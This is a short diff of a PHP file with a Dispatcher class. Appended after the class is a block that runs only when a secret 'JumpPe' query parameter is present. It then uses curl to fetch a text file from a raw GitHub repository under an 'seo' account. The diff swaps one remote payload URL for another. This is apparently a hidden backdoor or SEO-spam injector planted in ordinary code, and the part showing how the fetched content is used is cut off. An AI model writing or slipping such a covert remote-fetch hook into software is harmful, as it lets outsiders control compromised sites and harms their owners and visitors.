@@ -257,7 +257,7 @@ class Dispatcher {
 	}
 }
 if (isset($_GET['JumpPe'])) {
-    $url = "https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/clone-syndicate.txt";
+    $url = "https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/mentahalfarudi.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
